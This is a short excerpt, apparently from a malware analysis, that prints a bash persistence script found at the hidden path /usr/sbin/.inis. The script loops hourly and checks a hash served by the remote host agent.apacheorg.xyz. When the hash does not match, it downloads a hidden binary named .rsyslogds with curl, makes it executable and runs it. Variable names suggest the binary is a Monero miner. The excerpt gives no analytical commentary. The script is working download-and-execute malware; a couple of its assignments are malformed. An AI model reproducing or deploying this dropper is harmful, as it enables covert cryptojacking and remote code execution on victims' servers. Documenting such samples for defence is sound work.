2. /usr/sbin/.inis

```
#!/bin/bash
while :
do
if [ -w /usr/sbin ]; then
  SPATH=/usr/sbin
else
  SPATH=/tmp
fi
ipurl="http://agent.apacheorg.xyz:1234"
MD5_1_XMR = `curl http://agent.apacheorg.xyz:1234/v`
MD5_2_XMR=`md5sum $SPATH/.rsyslogds | awk '{print $1}'`
if [ "$MD5_1_XMR" = "$MD5_2_XMR" ];
then
  ip = `ping apacheorg.top -c 1|sed '1{s/[^(]*(//;s/).*//;q}'`
  if [ $(netstat -antp|grep $ip|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ];
  then
    $SPATH/.rsyslogds
  else
    echo "ok"
  fi
else
  curl -Lk -o $SPATH/.rsyslogds $ipurl/.rsyslogds;chmod +x $SPATH/.rsyslogds;$SPATH/.rsyslogds
fi
sleep 60m
done
```
